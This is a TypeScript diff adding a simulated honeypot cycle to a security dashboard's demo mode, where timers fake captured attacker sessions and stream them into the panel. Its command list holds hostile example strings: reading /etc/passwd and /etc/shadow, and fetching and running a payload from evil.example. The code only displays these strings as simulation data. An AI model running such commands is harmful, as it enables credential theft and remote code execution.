@@ -194,6 +194,10 @@ class Store {
   private state: AppState = initialState;
   private listeners = new Set<Listener>();
   private demoSimInterval: ReturnType<typeof setTimeout> | null = null;
+  // Demo Mode's honeypot capture cycle: one recurring "next capture" timer,
+  // plus the short-lived timers for the command stream within a capture.
+  private demoHoneypotTimer: ReturnType<typeof setTimeout> | null = null;
+  private demoHoneypotSubTimers: ReturnType<typeof setTimeout>[] = [];
   private eventIdCounter = 0;
 
   getState(): AppState {
@@ -430,6 +434,7 @@ setOverview(patch: Partial<OverviewMetrics>) {
       this.demoSimInterval = setTimeout(tick, 4000 + Math.random() * 1000);
     };
     this.demoSimInterval = setTimeout(tick, 4000 + Math.random() * 1000);
+    this.startDemoHoneypotCycle();
   }
 
   private stopDemoSimulation() {
@@ -437,6 +442,106 @@ setOverview(patch: Partial<OverviewMetrics>) {
       clearTimeout(this.demoSimInterval);
       this.demoSimInterval = null;
     }
+    this.stopDemoHoneypotCycle();
+  }
+
+  // Demo Mode honeypot: repeatedly runs a full waiting → captured → command
+  // stream → waiting cycle so the Honeypot panel looks as alive as the rest
+  // of the dashboard instead of sitting static while everything else moves.
+  private startDemoHoneypotCycle() {
+    if (this.demoHoneypotTimer) return; // already running
+    const commandPool = [
+      "whoami",
+      "id",
+      "ls -la",
+      "cat /etc/passwd",
+      "uname -a",
+      "ifconfig",
+      "history",
+      "sudo cat /etc/shadow",
+      "wget http://evil.example/payload.sh",
+      "chmod +x /tmp/payload.sh",
+      "./payload.sh -o /dev/null",
+    ];
+    const nowStr = () => new Date().toLocaleTimeString("en-GB", { hour12: false });
+
+    const runCycle = () => {
+      const sessionId = `SES-${Math.floor(1000 + Math.random() * 9000)}`;
+      const sourceIp = `203.0.113.${Math.floor(1 + Math.random() * 254)}`;
+
+      this.setFingerprint(
+        {
+          sourceIp,
+          sessionId,
+          detectionTime: nowStr(),
+          attackType: "Credential brute-force",
+          severity: "HIGH",
+          sessionStatus: "Captured",
+          honeypotStatus: "Active",
+        },
+        "captured"
+      );
+      this.appendEvent({
+        type: "honeypot_session_captured",
+        severity: "critical",
+        source: sourceIp,
+        sessionId,
+        attackType: "Credential brute-force",
+        timestamp: nowStr(),
+        message: "Attacker session captured by honeypot — redirecting into deception environment",
+      });
+      this.setOverview({ honeypotCaptures: this.state.overview.honeypotCaptures + 1 });
+
+      // Stream a handful of fake attacker commands, spaced out like a real
+      // interactive session.
+      const shuffled = [...commandPool].sort(() => Math.random() - 0.5);
+      const cmds = shuffled.slice(0, 4 + Math.floor(Math.random() * 3));
+      cmds.forEach((cmd, i) => {
+        const t = setTimeout(() => {
+          this.appendHoneypotCommand(cmd);
+          this.appendEvent({
+            type: "honeypot_command",
+            severity: "info",
+            command: cmd,
+            sessionId,
+            timestamp: nowStr(),
+            message: "Attacker command captured",
+          });
+        }, (i + 1) * 1100);
+        this.demoHoneypotSubTimers.push(t);
+      });
+
+      // Re-arm the honeypot once the fake session winds down.
+      const rearmDelay = cmds.length * 1100 + 2200;
+      const rearmTimer = setTimeout(() => {
+        this.setHoneypotStatus("waiting");
+        this.appendEvent({
+          type: "honeypot_waiting",
+          severity: "info",
+          timestamp: nowStr(),
+          message: "Honeypot re-armed and waiting",
+        });
+      }, rearmDelay);
+      this.demoHoneypotSubTimers.push(rearmTimer);
+
+      // Schedule the next capture.
+      this.demoHoneypotTimer = setTimeout(runCycle, rearmDelay + 6000 + Math.random() * 5000);
+    };
+
+    // First capture happens a few seconds after demo mode turns on, so it
+    // doesn't fire the exact instant the toggle is clicked.
+    this.demoHoneypotTimer = setTimeout(runCycle, 3000);
+  }
+
+  private stopDemoHoneypotCycle() {
+    if (this.demoHoneypotTimer) {
+      clearTimeout(this.demoHoneypotTimer);
+      this.demoHoneypotTimer = null;
+    }
+    this.demoHoneypotSubTimers.forEach((t) => clearTimeout(t));
+    this.demoHoneypotSubTimers = [];
+    // Leave the honeypot in a clean, re-armed state for next time.
+    this.setState({ honeypot: { status: "waiting", commands: [], fingerprint: null } });
   }
 
   openSettings(tab: AppState["settings"]["tab"] = "protected_target") {
